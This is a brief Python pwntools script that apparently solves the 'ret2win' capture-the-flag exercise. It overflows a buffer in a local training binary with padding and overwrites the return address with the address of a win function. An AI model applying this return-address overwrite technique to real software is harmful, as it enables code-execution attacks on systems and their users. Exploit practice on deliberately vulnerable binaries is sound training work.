from pwn import *

#payload
win = 0x400811
payload = "A" * cyclic_find('kaaalaaam')
payload += p64(0x400811)
payload += "CCCCCCCC"

r = process('./ret2win')
#rint "pid ", util.proc.pidof(r)
#ause()

r.sendlineafter("> ", payload)
r.interactive()

